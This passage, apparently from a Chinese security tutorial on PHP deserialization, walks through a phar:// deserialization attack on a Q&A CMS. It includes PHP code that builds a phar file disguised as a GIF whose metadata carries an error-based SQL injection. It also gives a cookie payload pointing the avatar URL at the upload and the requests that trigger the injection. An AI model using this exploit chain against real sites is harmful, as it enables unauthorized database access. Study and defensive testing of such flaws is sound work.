data-ratio="0.5414884516680923" src="图片/HACK学习呀_2021-06-16_Web安全PHP反序列化入门这一篇就够了/16_o7LDmSydzX6FXVicD0hrktS0tgBP8Q.png" onerror="this.src='https://mmbiz.qpic.cn/mmbiz_png/Uq8Qfeuvou9vcJ0AAlY5iaSI3yNdcJdRadEnJ9lql4f3yiaoQUySQTjPCmEo7LDmSydzX6FXVicD0hrktS0tgBP8Q/640?wx_fmt=png'" data-type="png" data-w="1169"  /></p><p><img data-ratio="0.33277870216306155" src="图片/HACK学习呀_2021-06-16_Web安全PHP反序列化入门这一篇就够了/17_RcIop7hALvaKruKVYgibxgCZINEWvA.png" onerror="this.src='https://mmbiz.qpic.cn/mmbiz_png/Uq8Qfeuvou9vcJ0AAlY5iaSI3yNdcJdRadibCSqquVIz4Lcaz1zzxk4XJbORcIop7hALvaKruKVYgibxgCZINEWvA/640?wx_fmt=png'" data-type="png" data-w="1202"  /></p><p><span style="font-size:15px;line-height:35px;;">找到了数据库<strong>users_weixin</strong>&nbsp;表,<strong>headimgurl&nbsp;</strong>对应&nbsp;<strong>$access_user['headimgurl']</strong>，并且<strong>$access_user</strong>&nbsp;为函数被调用时传入的参数，继续找哪里调用了<strong>bind_account&nbsp;</strong>方法</span></p><p><span style="font-size:15px;line-height:35px;;">在<strong>./app/m/weixin.php</strong></span></p><p><span style="font-size:15px;line-height:35px;;"><strong><img data-ratio="0.36651234567901236" src="图片/HACK学习呀_2021-06-16_Web安全PHP反序列化入门这一篇就够了/18_aQsFC7KnmCFcRhWaCfYia6F51QbR4w.png" onerror="this.src='https://mmbiz.qpic.cn/mmbiz_png/Uq8Qfeuvou9vcJ0AAlY5iaSI3yNdcJdRa17nE4VB8bXxw91cD9N7PqnsgYiaQsFC7KnmCFcRhWaCfYia6F51QbR4w/640?wx_fmt=png'" data-type="png" data-w="1296"  /></strong></span></p><p><span style="font-size:15px;line-height:35px;;">$WXConnect的值来源于COOKIE，而<strong>$access_user</strong>来源于<strong>$WXConnect['access_user']</strong>，而cookile是可控的,<strong>file_get_contents</strong>有了完全可控的参数,我们就可以利用&nbsp;phar://&nbsp;协议触发反序列化</span></p><p><span style="font-size:15px;line-height:35px;;"><strong>漏洞利用</strong></span></p><p><span style="font-size:15px;line-height:35px;;">注册一个账号</span></p><p><img data-ratio="0.38793879387938796" src="图片/HACK学习呀_2021-06-16_Web安全PHP反序列化入门这一篇就够了/19_XAaUIkSibqLJDPhNR3dr4hM9xVFvxw.png" onerror="this.src='https://mmbiz.qpic.cn/mmbiz_png/Uq8Qfeuvou9vcJ0AAlY5iaSI3yNdcJdRaHh38FhUqC7AQLAOQxGkQoDDATXAaUIkSibqLJDPhNR3dr4hM9xVFvxw/640?wx_fmt=png'" data-type="png" data-w="1111"  /></p><p><span style="font-size:15px;line-height:35px;;">选择发起一个问题,并上传一个图片</span></p><p><img data-ratio="0.40431519699812385" src="图片/HACK学习呀_2021-06-16_Web安全PHP反序列化入门这一篇就够了/20_JFt4YMWibcLiapCNpRGrXDHgUyMq9g.png" onerror="this.src='https://mmbiz.qpic.cn/mmbiz_png/Uq8Qfeuvou9vcJ0AAlY5iaSI3yNdcJdRaR0iaqtEt8HEr4jj4T4zF2BB6vOhJFt4YMWibcLiapCNpRGrXDHgUyMq9g/640?wx_fmt=png'" data-type="png" data-w="1066"  /></p><p><span style="font-size:15px;line-height:35px;;">上</span><span style="font-size:15px;line-height:35px;;">传一个phar文件,但改后缀为gif</span></p><p><span style="font-size:15px;line-height:35px;;"></span></p><section class="code-snippet__fix code-snippet__js"><ul class="code-snippet__line-index code-snippet__js"><li></li><li></li><li></li><li></li><li></li><li></li><li></li><li></li><li></li><li></li><li></li><li></li><li></li><li></li><li></li><li></li><li></li></ul><pre class="code-snippet__js" data-lang="xml"><code><span class="code-snippet_outer"><span class="code-snippet__meta">&lt;?php</span></span></code><code><span class="code-snippet_outer"><span class="code-snippet__class"><span class="code-snippet__keyword">class</span> <span class="code-snippet__title">AWS_MODEL</span></span>{</span></code><code><span class="code-snippet_outer"><span class="code-snippet__keyword">private</span> $_shutdown_query = <span class="code-snippet__keyword">array</span>();</span></code><code><span class="code-snippet_outer"><br  /></span></code><code><span class="code-snippet_outer"><br  /></span></code><code><span class="code-snippet_outer"><span class="code-snippet__keyword">public</span> <span class="code-snippet__function"><span class="code-snippet__keyword">function</span> <span class="code-snippet__title">__construct</span><span class="code-snippet__params">()</span></span>{</span></code><code><span class="code-snippet_outer"><span class="code-snippet__keyword">$this</span>-&gt;_shutdown_query[<span class="code-snippet__string">'test'</span>] = <span class="code-snippet__string">"SELECT UPDATEXML(1, concat(0xa, user(), 0xa), 1)"</span>;</span></code><code><span class="code-snippet_outer">}</span></code><code><span class="code-snippet_outer">}</span></code><code><span class="code-snippet_outer">$a = <span class="code-snippet__keyword">new</span> AWS_MODEL;</span></code><code><span class="code-snippet_outer">$phar = <span class="code-snippet__keyword">new</span> Phar(<span class="code-snippet__string">"11.phar"</span>);</span></code><code><span class="code-snippet_outer">$phar-&gt;startBuffering();</span></code><code><span class="code-snippet_outer">$phar-&gt;setStub(<span class="code-snippet__string">"GIF89a"</span>.<span class="code-snippet__string">"__HALT_COMPILER();"</span>);</span></code><code><span class="code-snippet_outer">$phar-&gt;setMetadata($a);</span></code><code><span class="code-snippet_outer">$phar-&gt;addFromString(<span class="code-snippet__string">"test.txt"</span>,<span class="code-snippet__string">"123"</span>);</span></code><code><span class="code-snippet_outer">$phar-&gt;stopBuffering();</span></code><code><span class="code-snippet_outer"><span class="code-snippet__meta">?&gt;</span></span></code></pre></section><p><span style="font-size:15px;line-height:35px;;"></span><br  /></p><p><img data-ratio="0.11008230452674897" src="图片/HACK学习呀_2021-06-16_Web安全PHP反序列化入门这一篇就够了/21_cuLNDHrrpTUIr4cMyA25icYaTb7WHw.png" onerror="this.src='https://mmbiz.qpic.cn/mmbiz_png/Uq8Qfeuvou9vcJ0AAlY5iaSI3yNdcJdRagwPIYJPLyaXUnYbgnx9YUia1KlcuLNDHrrpTUIr4cMyA25icYaTb7WHw/640?wx_fmt=png'" data-type="png" data-w="972"  /></p><p><span style="font-size:15px;line-height:35px;;">上传到服务器</span></p><p><img data-ratio="0.8023255813953488" src="图片/HACK学习呀_2021-06-16_Web安全PHP反序列化入门这一篇就够了/22_Hmja1HYmsT5fyousl0o5hia7Yiczzw.png" onerror="this.src='https://mmbiz.qpic.cn/mmbiz_png/Uq8Qfeuvou9vcJ0AAlY5iaSI3yNdcJdRaf9Q7t3rYS2m36UDLTKnuRCDKiciaHmja1HYmsT5fyousl0o5hia7Yiczzw/640?wx_fmt=png'" data-type="png" data-w="516"  /></p><p><span style="font-size:15px;line-height:35px;;">&nbsp;</span><span style="font-size:15px;line-height:35px;;">这里会返回绝对路径</span></p><p><img data-ratio="0.875" src="图片/HACK学习呀_2021-06-16_Web安全PHP反序列化入门这一篇就够了/23_jvR0jMxxibKibtznspBeC62Nx8ho1w.png" onerror="this.src='https://mmbiz.qpic.cn/mmbiz_png/Uq8Qfeuvou9vcJ0AAlY5iaSI3yNdcJdRaEHITiadCwbxz3hPvWPrgCtmkgM8jvR0jMxxibKibtznspBeC62Nx8ho1w/640?wx_fmt=png'" data-type="png" data-w="536"  /></p><p><span style="font-size:15px;line-height:35px;;">编造payload</span></p><p><span style="font-size:15px;line-height:35px;;"></span></p><section class="code-snippet__fix code-snippet__js"><ul class="code-snippet__line-index code-snippet__js"><li></li><li></li><li></li><li></li><li></li><li></li><li></li><li></li><li></li></ul><pre class="code-snippet__js" data-lang="markdown"><code><span class="code-snippet_outer"><span class="code-snippet__meta">&lt;?php</span></span></code><code><span class="code-snippet_outer">$arr = <span class="code-snippet__keyword">array</span>();</span></code><code><span class="code-snippet_outer"><span class="code-snippet_outer">$arr[<span class="code-snippet__string">'access_token'</span>] = <span class="code-snippet__keyword">array</span>(<span class="code-snippet__string">'openid'</span> =&gt;</span> '1');</span></code><code><span class="code-snippet_outer">$arr['access_user'] = array();</span></code><code><span class="code-snippet_outer">$arr[<span class="code-snippet__string">'access_user'</span>][<span class="code-snippet__symbol">'openid'</span>] = 1;</span></code><code><span class="code-snippet_outer">$arr[<span class="code-snippet__string">'access_user'</span>][<span class="code-snippet__symbol">'nickname'</span>] = 'admin';</span></code><code><span class="code-snippet_outer">$arr[<span class="code-snippet__string">'access_user'</span>][<span class="code-snippet__symbol">'headimgurl'</span>] = 'phar://uploads/question/20210606/ca6820646810c27e025258594bb905ea.gif';</span></code><code><span class="code-snippet_outer">echo json_encode($arr);</span></code><code><span class="code-snippet_outer">?&gt;</span></code></pre></section><p><span style="font-size:15px;line-height:35px;;"></span><br  /></p><p><img data-ratio="0.059966685174902834" src="图片/HACK学习呀_2021-06-16_Web安全PHP反序列化入门这一篇就够了/24_pUjmWGMVJyp0vkOvfh1Kx1pprvuQ7w.png" onerror="this.src='https://mmbiz.qpic.cn/mmbiz_png/Uq8Qfeuvou9vcJ0AAlY5iaSI3yNdcJdRanZhun7cuRCrbzialX9NFJaTRspUjmWGMVJyp0vkOvfh1Kx1pprvuQ7w/640?wx_fmt=png'" data-type="png" data-w="1801"  /></p><p><span style="font-size:15px;line-height:35px;;">带入cookie,并访问app/m/weixin.php下的binding_action,显示"绑定微信成功"</span><br  /></p><p><img data-ratio="0.4586739327883742" src="图片/HACK学习呀_2021-06-16_Web安全PHP反序列化入门这一篇就够了/25_O3LviaMfKEVvEVGa9g8SkOmV9jjozA.png" onerror="this.src='https://mmbiz.qpic.cn/mmbiz_png/Uq8Qfeuvou9vcJ0AAlY5iaSI3yNdcJdRaFeajQjnLeXkRwQ3elib2P6cpurO3LviaMfKEVvEVGa9g8SkOmV9jjozA/640?wx_fmt=png'" data-type="png" data-w="1101"  /></p><p><span style="font-size:15px;line-height:35px;;">最后访问app/account/ajax.php下的synch_img_action,注入成功</span><br  /></p><p><span style="font-size:15px;line-height:35px;;"><strong><img data-ratio="0.5646319569120287" src="图片/HACK学习呀_2021-06-16_Web安全PHP反序列化入门这一篇就够了/26_3Sib6ibZQVjQCt6UMicf0g8m4wT4Jw.png" onerror="this.src='https://mmbiz.qpic.cn/mmbiz_png/Uq8Qfeuvou9vcJ0AAlY5iaSI3yNdcJdRaujiaZ3OWacUuyzun9bnaKfFsKvam3Sib6ibZQVjQCt6UMicf0g8m4wT4Jw/640?wx_fmt=png'" data-type="png" data-w="1114"  /></strong></span></p><p><span style="font-size:15px;line-height:35px;;">&nbsp;</span></p><p><br  /></p><p><span style="font-size:15px;line-height:35px;;"><strong>参考</strong></span></p><p><span style="font-size:15px;line-height:35px;;"><strong><br  /></strong></span></p><p><span style="font-size:15px;line-height:35px;;">WeCenter3.3.4前台SQL注入&amp;任意文件删除&amp;RCE</span></p><p><span style="font-size:15px;line-height:35px;;">某Center v3.3.4 从前台反序列化任意SQL语句执行到前台RCE</span></p><p><span style="font-size:15px;line-height:35px;;">利用 phar 拓展 php 反序列化漏洞攻击面</span></p><p data-darkmode-bgcolor-15976329806349="rgb(25, 25, 25)" data-darkmode-original-bgcolor-15976329806349="rgb(255, 255, 255)" data-style="font family: -apple-system-font, BlinkMacSystemFont, &quot;Helvetica Neue&quot;, &quot;PingFang SC&quot;, &quot;Hiragino Sans GB&quot;, &quot;Microsoft YaHei UI&quot;, &quot;Microsoft YaHei&quot;, Arial, sans-serif; letter-spacing: 0.544px; white-space: normal; background-color: rgb(255, 255, 255); color: rgb(163, 163, 163) !important;" class="js_darkmode__0" data-darkmode-bgcolor-16121018536955="rgb(25, 25, 25)" data-darkmode-original-bgcolor-16121018536955="#fff|rgb(255, 255, 255)" data-darkmode-color-16121018536955="rgb(163, 163, 163)" data-darkmode-original-color-16121018536955="#fff|rgb(163, 163, 163)" style="font family: -apple-system, BlinkMacSystemFont, &quot;Helvetica Neue&quot;, &quot;PingFang SC&quot;, &quot;Hiragino Sans GB&quot;, &quot;Microsoft YaHei UI&quot;, &quot;Microsoft YaHei&quot;, Arial, sans-serif;letter-spacing: 0.544px;white-space: normal;background-color: rgb(255, 255, 255);"><img data-ratio="0.109375" src="图片/HACK学习呀_2021-06-16_Web安全PHP反序列化入门这一篇就够了/27_rsSo8PwNYlT1XzZ6fbwQuXBRKf4j3Q.png" onerror="this.src='https://mmbiz.qpic.cn/mmbiz_png/ndicuTO22p6ibN1yF91ZicoggaJJZX3vQ77Vhx81O5GRyfuQoBRjpaUyLOErsSo8PwNYlT1XzZ6fbwQuXBRKf4j3Q/640?wx_fmt=png'" data-type="png" data-w="640" style="box-sizing: border-box !important;visibility: visible !important;width: 640px !important;"  /></p><p data-darkmode-bgcolor-15976329806349="rgb(25, 25, 25)" data-darkmode-original-bgcolor-15976329806349="rgb(255, 255, 255)" data-style="font family: -apple-system-font, BlinkMacSystemFont, &quot;Helvetica Neue&quot;, &quot;PingFang SC&quot;, &quot;Hiragino Sans GB&quot;, &quot;Microsoft YaHei UI&quot;, &quot;Microsoft YaHei&quot;, Arial, sans-serif; letter-spacing: 0.544px; white-space: normal; background-color: rgb(255, 255, 255); text-align: center; color: rgb(163, 163, 163) !important;" class="js_darkmode__1" data-darkmode-bgcolor-16121018536955="rgb(25, 25, 25)" data-darkmode-original-bgcolor-16121018536955="#fff|rgb(255, 255, 255)" data-darkmode-color-16121018536955="rgb(163, 163, 163)" data-darkmode-original-color-16121018536955="#fff|rgb(163, 163, 163)" style="font family: -apple-system, BlinkMacSystemFont, &quot;Helvetica Neue&quot;, &quot;PingFang SC&quot;, &quot;Hiragino Sans GB&quot;, &quot;Microsoft YaHei UI&quot;, &quot;Microsoft YaHei&quot;, Arial, sans-serif;letter-spacing: 0.544px;white-space: normal;background-color: rgb(255, 255, 255);"><br data-darkmode-bgcolor-16121018536955="rgb(25, 25, 25)" data-darkmode-original-bgcolor-16121018536955="#fff|rgb(255, 255, 255)" data-darkmode-color-16121018536955="rgb(163, 163, 163)" data-darkmode-original-color-16121018536955="#fff|rgb(163, 163, 163)"  /></p><p data-darkmode-bgcolor-15976329806349="rgb(25, 25, 25)" data-darkmode-original-bgcolor-15976329806349="rgb(255, 255, 255)" data-style="font family: -apple-system-font, BlinkMacSystemFont, &quot;Helvetica Neue&quot;, &quot;PingFang SC&quot;, &quot;Hiragino Sans GB&quot;, &quot;Microsoft YaHei UI&quot;, &quot;Microsoft YaHei&quot;, Arial, sans-serif; letter-spacing: 0.544px; white-space: normal; background-color: rgb(255, 255, 255); text-align: center; color: rgb(163, 163, 163) !important;" class="js_darkmode__2" data-darkmode-bgcolor-16121018536955="rgb(25, 25, 25)" data-darkmode-original-bgcolor-16121018536955="#fff|rgb(255, 255, 255)" data-darkmode-color-16121018536955="rgb(163, 163, 163)" data-darkmode-original-color-16121018536955="#fff|rgb(163, 163, 163)" style="font family: -apple-system, BlinkMacSystemFont, &quot;Helvetica Neue&quot;, &quot;PingFang SC&quot;, &quot;Hiragino Sans GB&quot;, &quot;Microsoft YaHei UI&quot;, &quot;Microsoft YaHei&quot;, Arial, sans-serif;letter-spacing: 0.544px;white-space: normal;background-color: rgb(255, 255, 255);text-align: center;"><strong>推荐阅读：</strong></p><p data-darkmode-bgcolor-15976329806349="rgb(25, 25, 25)" data-darkmode-original-bgcolor-15976329806349="rgb(255, 255, 255)" data-style="font family: -apple-system-font, BlinkMacSystemFont, &quot;Helvetica Neue&quot;, &quot;PingFang SC&quot;, &quot;Hiragino Sans GB&quot;, &quot;Microsoft YaHei UI&quot;, &quot;Microsoft YaHei&quot;, Arial, sans-serif; letter-spacing: 0.544px; white-space: normal; background-color: rgb(255, 255, 255); text-align: center; color: rgb(163, 163, 163) !important;" class="js_darkmode__2" data-darkmode-bgcolor-16121018536955="rgb(25, 25, 25)" data-darkmode-original-bgcolor-16121018536955="#fff|rgb(255, 255, 255)" data-darkmode-color-16121018536955="rgb(163, 163, 163)" data-darkmode-original-color-16121018536955="#fff|rgb(163, 163, 163)" style="font family: -apple-system, BlinkMacSystemFont, &quot;Helvetica Neue&quot;, &quot;PingFang SC&quot;, &quot;Hiragino Sans GB&quot;, &quot;Microsoft YaHei UI&quot;, &quot;Microsoft YaHei&quot;, Arial, sans-serif;letter-spacing: 0.544px;white-space: normal;background-color: rgb(255, 255, 255);text-align: center;"><br  /></p><p data-darkmode-bgcolor-15976329806349="rgb(25, 25, 25)" data-darkmode-original-bgcolor-15976329806349="rgb(255, 255, 255)" data-style="font family: -apple-system-font, BlinkMacSystemFont, &quot;Helvetica Neue&quot;, &quot;PingFang SC&quot;, &quot;Hiragino Sans GB&quot;, &quot;Microsoft YaHei UI&quot;, &quot;Microsoft YaHei&quot;, Arial, sans-serif; letter-spacing: 0.544px; white-space: normal; background-color: rgb(255, 255, 255); text-align: center; color: rgb(163, 163, 163) !important;" class="js_darkmode__4" data-darkmode-bgcolor-16121018536955="rgb(25, 25, 25)" data-darkmode-original-bgcolor-16121018536955="#fff|rgb(255, 255, 255)" data-darkmode-color-16121018536955="rgb(163, 163, 163)" data-darkmode-original-color-16121018536955="#fff|rgb(163, 163, 163)" style="font family: -apple-system, BlinkMacSystemFont, &quot;Helvetica Neue&quot;, &quot;PingFang SC&quot;, &quot;Hiragino Sans GB&quot;, &quot;Microsoft YaHei UI&quot;, &quot;Microsoft YaHei&quot;, Arial, sans-serif;letter-spacing: 0.544px;white-space: normal;background-color: rgb(255, 255, 255);text-align: center;"><span style="color: rgb(255, 104, 39);font-size:15px;line-height:35px;;letter-spacing: 0.544px;">本月报名可以参加抽奖送暗夜精灵6Pro笔记本电脑的优惠活动</span></p><p data-darkmode-bgcolor-15976329806349="rgb(25, 25, 25)" data-darkmode-original-bgcolor-15976329806349="rgb(255, 255, 255)" data-style="font family: -apple-system-font, BlinkMacSystemFont, &quot;Helvetica Neue&quot;, &quot;PingFang SC&quot;, &quot;Hiragino Sans GB&quot;, &quot;Microsoft YaHei UI&quot;, &quot;Microsoft YaHei&quot;, Arial, sans-serif; letter-spacing: 0.544px; white-space: normal; background-color: rgb(255, 255, 255); text-align: center; color: rgb(163, 163, 163) !important;" class="js_darkmode__4" data-darkmode-bgcolor-16121018536955="rgb(25, 25, 25)" data-darkmode-original-bgcolor-16121018536955="#fff|rgb(255, 255, 255)" data-darkmode-color-16121018536955="rgb(163, 163, 163)" data-darkmode-original-color-16121018536955="#fff|rgb(163, 163, 163)" style="font family: -apple-system, BlinkMacSystemFont, &quot;Helvetica Neue&quot;, &quot;PingFang SC&quot;, &quot;Hiragino Sans GB&quot;, &quot;Microsoft YaHei UI&quot;, &quot;Microsoft YaHei&quot;, Arial, sans-serif;letter-spacing: 0.544px;white-space: normal;background-color: rgb(255, 255, 255);"><br  /></p><p style="font family: -apple-system, BlinkMacSystemFont, &quot;Helvetica Neue&quot;, &quot;PingFang SC&quot;, &quot;Hiragino Sans GB&quot;, &quot;Microsoft YaHei UI&quot;, &quot;Microsoft YaHei&quot;, Arial, sans-serif;letter-spacing: 0.544px;white-space: normal;background-color: rgb(255, 255, 255);"><a target="_blank" href="http://mp.weixin.qq.com/s?__biz=MzI5MDU1NDk2MA==&amp;mid=2247496998&amp;idx=1&amp;sn=da047300e19463fc88fcd3e76fda4203&amp;chksm=ec1ca019db6b290f06c736843c2713464a65e6b6dbeac9699abf0b0a34d5ef442de4654d8308&amp;scene=21#wechat_redirect" textvalue="你已选中了添加链接的内容" data-itemshowtype="0" tab="innerlink" data-linktype="1" hasload="1" style="-webkit-tap-highlight-color: rgba(0, 0, 0, 0);cursor: pointer;"><span class="js_jump_icon h5_image_link" data-positionback="static" style="line-height: 0;inset: auto;"><img class="rich_pages" data-ratio="0.4255555555555556" data-s="300,640" src="图片/HACK学习呀_2021-06-16_Web安全PHP反序列化入门这一篇就够了/28_1icJc9VoX8KbdFsB6plzmBCTjGDibQ.png" onerror="this.src='https://mmbiz.qpic.cn/mmbiz_png/Uq8QfeuvouibHHibNbEpsAMia19jkGuuz9tTIfiauo7fjdWicOTGhPibiat3Kt90m1icJc9VoX8KbdFsB6plzmBCTjGDibQ/640?wx_fmt=png'" data-type="png" data-w="900" style="border-width: 0px;border-style: initial;border-color: initial;border-radius: 30px;inset: auto;box-sizing: border-box !important;visibility: visible !important;width: 677px !important;"  /></span></a></p><p data-darkmode-bgcolor-15976329806349="rgb(25, 25, 25)" data-darkmode-original-bgcolor-15976329806349="rgb(255, 255, 255)" data-style="font family: -apple-system-font, BlinkMacSystemFont, &quot;Helvetica Neue&quot;, &quot;PingFang SC&quot;, &quot;Hiragino Sans GB&quot;, &quot;Microsoft YaHei UI&quot;, &quot;Microsoft YaHei&quot;, Arial, sans-serif; letter-spacing: 0.544px; white-space: normal; background-color: rgb(255, 255, 255); text-align: center; color: rgb(163, 163, 163) !important;" class="js_darkmode__14" data-darkmode-bgcolor-16121018536955="rgb(25, 25, 25)" data-darkmode-original-bgcolor-16121018536955="#fff|rgb(255, 255, 255)" data-darkmode-color-16121018536955="rgb(163, 163, 163)" data-darkmode-original-color-16121018536955="#fff|rgb(163, 163, 163)" style="font family: -apple-system, BlinkMacSystemFont, &quot;Helvetica Neue&quot;, &quot;PingFang SC&quot;, &quot;Hiragino Sans GB&quot;, &quot;Microsoft YaHei UI&quot;, &quot;Microsoft YaHei&quot;, Arial, sans-serif;letter-spacing: 0.544px;white-space: normal;background-color: rgb(255, 255, 255);"><br  /></p><p data-darkmode-bgcolor-16121018536955="rgb(25, 25, 25)" data-darkmode-original-bgcolor-16121018536955="#fff|rgb(255, 255, 255)" data-style="font family: -apple-system-font, BlinkMacSystemFont, &quot;Helvetica Neue&quot;, &quot;PingFang SC&quot;, &quot;Hiragino Sans GB&quot;, &quot;Microsoft YaHei UI&quot;, &quot;Microsoft YaHei&quot;, Arial, sans-serif; letter-spacing: 0.544px; white-space: normal; background-color: rgb(255, 255, 255); text-align: center;" class="js_darkmode__15" style="font family: -apple-system, BlinkMacSystemFont, &quot;Helvetica Neue&quot;, &quot;PingFang SC&quot;, &quot;Hiragino Sans GB&quot;, &quot;Microsoft YaHei UI&quot;, &quot;Microsoft YaHei&quot;, Arial, sans-serif;letter-spacing: 0.544px;white-space: normal;background-color: rgb(255, 255, 255);text-align: center;"><span style="font-size:18px;line-height:38px;;color: rgb(255, 104, 39);"><strong>点赞，转发，在看</strong></span></p><p data-darkmode-bgcolor-15976329806349="rgb(25, 25, 25)" data-darkmode-original-bgcolor-15976329806349="rgb(255, 255, 255)" data-style="font family: -apple-system-font, BlinkMacSystemFont, &quot;Helvetica Neue&quot;, &quot;PingFang SC&quot;, &quot;Hiragino Sans GB&quot;, &quot;Microsoft YaHei UI&quot;, &quot;Microsoft YaHei&quot;, Arial, sans-serif; letter-spacing: 0.544px; white-space: normal; background-color: rgb(255, 255, 255); text-align: center;" style="font family: -apple-system, BlinkMacSystemFont, &quot;Helvetica Neue&quot;, &quot;PingFang SC&quot;, &quot;Hiragino Sans GB&quot;, &quot;Microsoft YaHei UI&quot;, &quot;Microsoft YaHei&quot;, Arial, sans-serif;letter-spacing: 0.544px;white-space: normal;background-color: rgb(255, 255, 255);text-align: right;"><br  /></p><p data-darkmode-bgcolor-15976329806349="rgb(25, 25, 25)" data-darkmode-original-bgcolor-15976329806349="rgb(255, 255, 255)" data-style="font family: -apple-system-font, BlinkMacSystemFont, &quot;Helvetica Neue&quot;, &quot;PingFang SC&quot;, &quot;Hiragino Sans GB&quot;, &quot;Microsoft YaHei UI&quot;, &quot;Microsoft YaHei&quot;, Arial, sans-serif; letter-spacing: 0.544px; white-space: normal; background-color: rgb(255, 255, 255); text-align: center;" style="font family: -apple-system, BlinkMacSystemFont, &quot;Helvetica Neue&quot;, &quot;PingFang SC&quot;, &quot;Hiragino Sans GB&quot;, &quot;Microsoft YaHei UI&quot;, &quot;Microsoft YaHei&quot;, Arial, sans-serif;letter-spacing: 0.544px;white-space: normal;background-color: rgb(255, 255, 255);text-align: right;"><span style="font-size:12px;line-height:32px;;">投稿作者：Buffer</span></p><p style="font family: -apple-system, BlinkMacSystemFont, &quot;Helvetica Neue&quot;, &quot;PingFang SC&quot;, &quot;Hiragino Sans GB&quot;, &quot;Microsoft YaHei UI&quot;, &quot;Microsoft YaHei&quot;, Arial, sans-serif;letter-spacing: 0.544px;white-space: normal;background-color: rgb(255, 255, 255);"><img class="rich_pages __bg_gif" data-ratio="0.5197505197505198" src="图片/HACK学习呀_2021-06-16_Web安全PHP反序列化入门这一篇就够了/29_EedaMZeibI6cKE55jiaLMf9APuY0pA.gif" onerror="this.src='https://mmbiz.qpic.cn/mmbiz_gif/Uq8QfeuvouibQiaEkicNSzLStibHWxDSDpKeBqxDe6QMdr7M5ld84NFX0Q5HoNEedaMZeibI6cKE55jiaLMf9APuY0pA/640?wx_fmt=gif'" data-type="gif" data-w="962" style="box-sizing: border-box !important;visibility: visible !important;width: 677px !important;"  /></p><p><br  /></p>
                </div>
</div>
</body>
</html>